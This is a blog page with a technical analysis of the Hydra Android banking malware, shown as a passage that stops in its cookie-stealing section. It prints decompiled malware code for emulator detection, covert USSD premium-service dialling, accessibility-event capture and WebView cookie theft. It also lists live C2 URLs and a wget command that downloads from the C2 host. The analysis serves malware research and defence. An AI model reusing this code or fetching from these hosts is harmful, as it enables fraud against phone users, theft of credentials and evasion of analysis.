<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Technical analysis of Hydra android malware - muha2xmad</title>
<meta name="description" content="بسم الله الرحمن الرحيم  ">


  <meta name="author" content="Muhammad Hasan Ali">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="muha2xmad">
<meta property="og:title" content="Technical analysis of Hydra android malware">
<meta property="og:url" content="https://muha2xmad.github.io/malware-analysis/hydra/">


  <meta property="og:description" content="بسم الله الرحمن الرحيم  ">



  <meta property="og:image" content="https://muha2xmad.github.io/assets/images/MA/hydra/hyd.jfif">





  <meta property="article:published_time" content="2022-09-20T00:00:00+00:00">





  

  


<link rel="canonical" href="https://muha2xmad.github.io/malware-analysis/hydra/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Muhammad Hasan Ali",
      "url": "https://muha2xmad.github.io/"
    
  }
</script>


  <meta name="google-site-verification" content="yjK5jUGtGuvD9i_1SEaec8FrngezWj1KJqBbPuPRAQM" />





<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="muha2xmad Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site/lo.png">
<!-- <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site/lo.png"> -->
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site/lo.png" alt=""></a>
        
        <a class="site-title" href="/">
          muha2xmad
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Malware-analysis">Malware analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Mal-Document">Mal Documents</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site/ed.jpg" alt="Muhammad Hasan Ali" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Muhammad Hasan Ali</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Egypt</span>
        </li>
      

      
        
          
        
          
            <li><a href="https://twitter.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
        
          
            <li><a href="https://www.linkedin.com/in/muhammadhasanali/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/muha2xmad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Technical analysis of Hydra android malware">
    <meta itemprop="description" content="بسم الله الرحمن الرحيم">
    <meta itemprop="datePublished" content="2022-09-20T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Technical analysis of Hydra android malware
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  11 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#unpacking">Unpacking</a></li>
  <li><a href="#anti-emulator">Anti-emulator</a>
    <ul>
      <li><a href="#solution">Solution</a></li>
    </ul>
  </li>
  <li><a href="#premium-services">Premium services</a></li>
  <li><a href="#steal-cookies">Steal cookies</a></li>
  <li><a href="#keylogger">Keylogger</a></li>
  <li><a href="#classic-features">Classic Features</a>
    <ul>
      <li><a href="#notification-intercepting">Notification intercepting</a></li>
      <li><a href="#call-forwarding">Call Forwarding</a></li>
      <li><a href="#overlay-attack">Overlay attack</a></li>
      <li><a href="#steal-contacts">Steal contacts</a></li>
    </ul>
  </li>
  <li><a href="#iocs">IoCs</a></li>
  <li><a href="#yara-rule">Yara rule</a></li>
  <li><a href="#article-quote">Article quote</a></li>
  <li><a href="#ref">REF</a></li>
</ul>

            </nav>
          </aside>
        
        <p><strong>بسم الله الرحمن الرحيم</strong></p>

<p><strong>FreePalestine</strong></p>

<h1 id="unpacking">Unpacking</h1>

<p>If we unzip the sample and explore the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code>, we see that the entry point <code class="language-plaintext highlighter-rouge">com.sdktools.android.MainActivity</code> is not found in the code of the sample. This an indication of a packed sample. You can identify the packing technique using <a href="https://github.com/cryptax/droidlysis">droidlysis</a> or <a href="https://github.com/rednaga/APKiD">APKiD</a>. If we use <code class="language-plaintext highlighter-rouge">droidlysis</code>, We can see the it the sample uses <code class="language-plaintext highlighter-rouge">DexClassLoader</code>, malware uses <code class="language-plaintext highlighter-rouge">JsonPacker</code> packer. So we need to get the decrypted payload of the sample. We will use <a href="https://github.com/frida/frida">Frida</a> to get the decrypted payload. We will install the sample on the Android studio as an emulator and by using WSL on my host we will launch Frida to start the malicous APP to get the payload. Then we pull the payload to our host from the emulator.</p>

<p align="center">
  <img src="/assets/images/MA/hydra/1.png" />
</p>
<center><font size="3"> <u>Figure</u>(1) KCFj.json is our decrypted payload<u></u> </font></center>
<p><br /></p>

<h1 id="anti-emulator">Anti-emulator</h1>

<p>I tried to run the sample in the emulator such as <code class="language-plaintext highlighter-rouge">android studio</code> and intercept the traffic between the malware and the C2 server with <code class="language-plaintext highlighter-rouge">Burp suite</code>. But It didn’t go as well as my last analysis of a previous sample of <code class="language-plaintext highlighter-rouge">Hydra</code> on <a href="https://twitter.com/muha2xmad/status/1570788983474638849">my twitter</a>. Then I used our magic tool <a href="https://github.com/cryptax/droidlysis">droidlysis</a> to get the Properties of the payload <code class="language-plaintext highlighter-rouge">KCFj.json</code>. I see the payload is checking if there’s an qemu emulator.</p>

<p align="center">
  <img src="/assets/images/MA/hydra/2.png" />
</p>
<center><font size="3"> <u>Figure</u>(2) droidlysis result for qemu detection in sample code<u></u> </font></center>
<p><br /></p>

<p>Then I used <a href="">APKiD</a> tool to get more details of the anti-emulation technique’s code.</p>
<p align="center">
  <img src="/assets/images/MA/hydra/3.png" />
</p>
<center><font size="3"> <u>Figure</u>(3) APKiD result for anti-vm detection in sample code<u></u> </font></center>
<p><br /></p>

<p>We get the sample code for detecting VM, in <code class="language-plaintext highlighter-rouge">SdkManagerImpl</code> class located in <code class="language-plaintext highlighter-rouge">com.sdktools.android.bot</code>. If one of these checks is true, then i guess the malware will act differently. The malware won’t communicate with the C2 server to get the targeted APPs to perform the <code class="language-plaintext highlighter-rouge">Overlay attack</code> or to get the <code class="language-plaintext highlighter-rouge">mirrors/domains</code>. We will see.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">static</span> <span class="n">boolean</span> <span class="nf">isEmulator</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">BRAND</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="s">"generic"</span><span class="p">))</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">DEVICE</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="s">"generic"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">FINGERPRINT</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="s">"generic"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">FINGERPRINT</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="s">"unknown"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">HARDWARE</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"goldfish"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">HARDWARE</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"ranchu"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">MODEL</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"google_sdk"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">MODEL</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"Emulator"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">MODEL</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"Android SDK built for x86"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">MANUFACTURER</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"Genymotion"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">PRODUCT</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"sdk_google"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">PRODUCT</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"google_sdk"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">PRODUCT</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"sdk"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">PRODUCT</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"sdk_x86"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">PRODUCT</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"vbox86p"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">PRODUCT</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"emulator"</span><span class="p">))</span> <span class="p">||</span> <span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">PRODUCT</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="s">"simulator"</span><span class="p">));</span>
    <span class="p">}</span>
</code></pre></div></div>

<h2 id="solution">Solution</h2>

<p>When I counter a sample uses anti-emulation techniques, I use <a href="https://tria.ge/220920-nvay7sgean">tria.ge</a> to get the traffic between the malware and the C2 server. If you go to the previous link, you will find the communication between the malware and the C2 server. You can download the files using <code class="language-plaintext highlighter-rouge">wget + link</code> such as <code class="language-plaintext highlighter-rouge">wget http://lalabanda.com/payload</code>.</p>

<p align="center">
  <img src="/assets/images/MA/hydra/4.png" />
</p>
<center><font size="3"> <u>Figure</u>(4) Communication between C2 and the malware<u></u> </font></center>
<p><br /></p>

<p>When we download <code class="language-plaintext highlighter-rouge">mirrors</code> file from <code class="language-plaintext highlighter-rouge">http://lalabanda.com/api/mirrors</code>, we will find encoded domains. I guess when the main C2 server is down, the malware will communicate with the mirrors or domains that we downloaded. You can find these donmains in the <a href="https://muha2xmad.github.io/malware-analysis/hydra/#iocs">IoCs section</a>.</p>

<p>Then we see a zip file called <code class="language-plaintext highlighter-rouge">jk5xWNYPKnTh4e7LP6vPG8z4YiBmoQYtKefRNId1.zip</code> which we can download from <code class="language-plaintext highlighter-rouge">http://lalabanda.com/storage/zip/jk5xWNYPKnTh4e7LP6vPG8z4YiBmoQYtKefRNId1.zip</code>. After downloading the file and unzip it, we see it contains two folders. First contains <code class="language-plaintext highlighter-rouge">icons</code> and the second is <code class="language-plaintext highlighter-rouge">inj</code> which contains 360 folders named with the targeted APPs. Inside the folders located in <code class="language-plaintext highlighter-rouge">inj</code> folder, there are the <code class="language-plaintext highlighter-rouge">html</code> files which will be used in the <code class="language-plaintext highlighter-rouge">Overlay attack</code>.</p>

<p align="center">
  <img src="/assets/images/MA/hydra/5.png" />
</p>
<center><font size="3"> <u>Figure</u>(5) targeted apps which contains html files to perform overlay attack<u></u> </font></center>
<p><br /></p>

<h1 id="premium-services">Premium services</h1>

<p>The malware will try to subscribe to a premium service without the knowledge of the user which will charge the SIM more money.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">void</span> <span class="nf">launchUssdCode</span><span class="p">(</span><span class="n">Context</span> <span class="n">context0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="n">ussdCalledTimeInMs</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="nf">currentTimeMillis</span><span class="p">();</span>
        <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"log -&gt; [%s]"</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">s</span><span class="p">});</span>
        <span class="n">Intent</span> <span class="n">intent0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="s">"android.intent.action.CALL"</span><span class="p">,</span> <span class="n">Uri</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s">"tel:"</span> <span class="p">+</span> <span class="n">s</span><span class="p">.</span><span class="nf">replaceAll</span><span class="p">(</span><span class="s">"#"</span><span class="p">,</span> <span class="n">Uri</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="s">"#"</span><span class="p">))));</span>
        <span class="n">intent0</span><span class="p">.</span><span class="nf">addFlags</span><span class="p">(</span><span class="m">0x10000000</span><span class="p">);</span>
        <span class="n">intent0</span><span class="p">.</span><span class="nf">addFlags</span><span class="p">(</span><span class="m">0x20000000</span><span class="p">);</span>
        <span class="n">context0</span><span class="p">.</span><span class="nf">startActivity</span><span class="p">(</span><span class="n">intent0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="n">boolean</span> <span class="nf">onAccessibilityEvent</span><span class="p">(</span><span class="n">InjAccessibilityService</span> <span class="n">injAccessibilityService0</span><span class="p">,</span> <span class="n">AccessibilityEvent</span> <span class="n">accessibilityEvent0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">accessibilityEvent0</span> <span class="p">!=</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getSource</span><span class="p">()</span> <span class="p">!=</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">equalsIgnoreCase</span><span class="p">(</span><span class="s">"com.android.phone"</span><span class="p">))</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getClassName</span><span class="p">().</span><span class="nf">toString</span><span class="p">().</span><span class="nf">toLowerCase</span><span class="p">().</span><span class="nf">contains</span><span class="p">(</span><span class="s">"dialog"</span><span class="p">))</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getText</span><span class="p">().</span><span class="nf">isEmpty</span><span class="p">())</span> <span class="p">{</span>
            <span class="n">StringBuilder</span> <span class="n">stringBuilder0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
            <span class="k">for</span><span class="p">(</span><span class="n">Object</span> <span class="n">object0</span><span class="p">:</span> <span class="n">accessibilityEvent0</span><span class="p">.</span><span class="nf">getText</span><span class="p">())</span> <span class="p">{</span>
                <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">" | "</span><span class="p">);</span>
                <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(((</span><span class="n">CharSequence</span><span class="p">)</span><span class="n">object0</span><span class="p">));</span>
            <span class="p">}</span>

            <span class="n">UssdComponent</span><span class="p">.</span><span class="nf">sendPhoneNumber</span><span class="p">(</span><span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<h1 id="steal-cookies">Steal cookies</h1>

<p>The malware will try to steal Cookies from APPs such as <code class="language-plaintext highlighter-rouge">Facebook</code> and <code class="language-plaintext highlighter-rouge">google</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">class</span> <span class="nc">CookiesReaderViewerActivityInterfaceImpl</span> <span class="n">extends</span> <span class="n">IScreen</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">interface</span> <span class="nc">LifeCycleListener</span> <span class="p">{</span>
        <span class="n">boolean</span> <span class="nf">onPause</span><span class="p">();</span>

        <span class="n">boolean</span> <span class="nf">onResume</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="n">InjectCookiesModel</span> <span class="n">cookieModel</span><span class="p">;</span>
    <span class="k">private</span> <span class="n">LifeCycleListener</span> <span class="n">lifeCycleListener</span><span class="p">;</span>
    <span class="k">private</span> <span class="n">WebView</span> <span class="n">webView</span><span class="p">;</span>

    <span class="k">public</span> <span class="nf">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">(</span><span class="n">InjectCookiesModel</span> <span class="n">injectCookiesModel0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span> <span class="p">=</span> <span class="n">injectCookiesModel0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="nf">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">(</span><span class="n">InjectCookiesModel</span> <span class="n">injectCookiesModel0</span><span class="p">,</span> <span class="n">LifeCycleListener</span> <span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span> <span class="p">=</span> <span class="n">injectCookiesModel0</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="n">lifeCycleListener</span> <span class="p">=</span> <span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">void</span> <span class="nf">handleData</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">clearView</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span><span class="p">.</span><span class="nf">getFirstScreen</span><span class="p">();</span>
            <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
            <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"INJECTS -&gt; display file: "</span> <span class="p">+</span> <span class="n">s</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setDomStorageEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setMixedContentMode</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
        <span class="n">com</span><span class="p">.</span><span class="n">sdktools</span><span class="p">.</span><span class="n">android</span><span class="p">.</span><span class="n">bot</span><span class="p">.</span><span class="n">components</span><span class="p">.</span><span class="n">injects</span><span class="p">.</span><span class="n">system</span><span class="p">.</span><span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="m">1</span> <span class="n">cookiesReaderViewerActivityInterfaceImpl</span><span class="err">$</span><span class="m">10</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebViewClient</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">@Override</span>  <span class="c1">// android.webkit.WebViewClient</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">onPageFinished</span><span class="p">(</span><span class="n">WebView</span> <span class="n">webView0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">super</span><span class="p">.</span><span class="nf">onPageFinished</span><span class="p">(</span><span class="n">webView0</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">contains</span><span class="p">(</span><span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span><span class="p">.</span><span class="nf">getScreenToFinish</span><span class="p">()))</span> <span class="p">{</span>
                    <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="n">CookieManager</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">().</span><span class="nf">getCookie</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
                    <span class="n">StringBuilder</span> <span class="n">stringBuilder0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"print event:"</span><span class="p">);</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span><span class="p">.</span><span class="nf">getFirstScreen</span><span class="p">()</span> <span class="p">+</span> <span class="s">" cookies data | \n"</span><span class="p">);</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">CookieManager</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">().</span><span class="nf">getCookie</span><span class="p">(</span><span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span><span class="p">.</span><span class="nf">getFirstScreen</span><span class="p">()));</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"      \n"</span><span class="p">);</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"      \n"</span><span class="p">);</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span><span class="p">.</span><span class="nf">getScreenToFinish</span><span class="p">()</span> <span class="p">+</span> <span class="s">" cookies data | \n"</span><span class="p">);</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">CookieManager</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">().</span><span class="nf">getCookie</span><span class="p">(</span><span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span><span class="p">.</span><span class="nf">getScreenToFinish</span><span class="p">()));</span>
                    <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(!</span><span class="n">TextUtils</span><span class="p">.</span><span class="nf">isEmpty</span><span class="p">(</span><span class="n">stringBuilder0</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">String</span> <span class="n">s2</span> <span class="p">=</span> <span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">cookieModel</span><span class="p">.</span><span class="nf">getApplicationId</span><span class="p">();</span>
                        <span class="n">InjectComponent</span><span class="p">.</span><span class="k">get</span><span class="p">().</span><span class="nf">getConfigsProvider</span><span class="p">().</span><span class="nf">getInjectHandler</span><span class="p">().</span><span class="nf">handleWebViewLog</span><span class="p">(</span><span class="n">CookiesReaderViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">,</span> <span class="n">s2</span><span class="p">,</span> <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">toString</span><span class="p">());</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="n">@Override</span>  <span class="c1">// android.webkit.WebViewClient</span>
            <span class="k">public</span> <span class="n">boolean</span> <span class="nf">shouldOverrideUrlLoading</span><span class="p">(</span><span class="n">WebView</span> <span class="n">webView0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"INJECTS -&gt; ulr loaded: "</span> <span class="p">+</span> <span class="n">s</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
                <span class="n">webView0</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">};</span>
